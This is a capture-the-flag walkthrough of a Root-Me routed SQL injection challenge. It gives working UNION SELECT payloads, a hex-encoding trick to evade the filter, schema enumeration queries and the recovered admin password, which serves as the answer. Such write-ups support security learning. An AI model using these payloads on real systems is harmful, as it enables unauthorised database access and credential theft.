# [SQL Injection Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)

So I think the injection is going to be done in the "Search" functionality instead of the login.

If we search for `admin`, we get a successful result.

If we try to get all results with `' or 1=1-- `, we get an "Attack Detected!"

So after trying `admin'-- ` and some other quick tests, we realize that `OR` triggered that 
protection. What about `admin' and 1=1-- `? Same thing.

A little search on "Routed SQL Injection" turned up [this useful explanation](http://www.securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html)

Basically what we type gets sent to a query, and the results of that query get sent to another.

So can we control the results of the first query? Sure.

`' union select 1-- `

Will make the first query always return 1. Which gives us the user with id `1`

`' union select ' order by 1-- `

"Attack Detected!"

Dammit. SQL SELECT statements can be hex encoded. let's try that again but in hex.

`' union select 0x27206f7264657220627920342d2d20-- `

Where `0x27206f7264657220627920342d2d20` is `' order by 1-- ` hex encoded. Notice the extra 
comment at the end. That's so the first query is comment ended and the second query is also 
comment ended when it's decoded and ran.

Got it to run. So we can find out how many columns. There are 2 because:

`' union select ' order by 3-- ` fails.

Let's see what types of columns we have:

`' union select 1,'a'-- ` (encoded: `' union select 0x2720756e696f6e2073656c65637420312c2761272d2d20-- `

Returns `a` as the email. So let's get the table name:

`' union select 1,group_concat(table_name) from information_schema.tables where ascii(table_name)>90-- `

Don't forget to hex encode. So the only table we're looking at is `users`

And the columns?

`' union select 1,column_name from information_schema.columns where table_name='users'-- `

Four columns: `id`,`login`,`password`,`email`

So enough messing around let's get the admin password:

`' union select 1,password from users where login='admin'-- `

Got it!

Password is: **qs89QdAs9A**


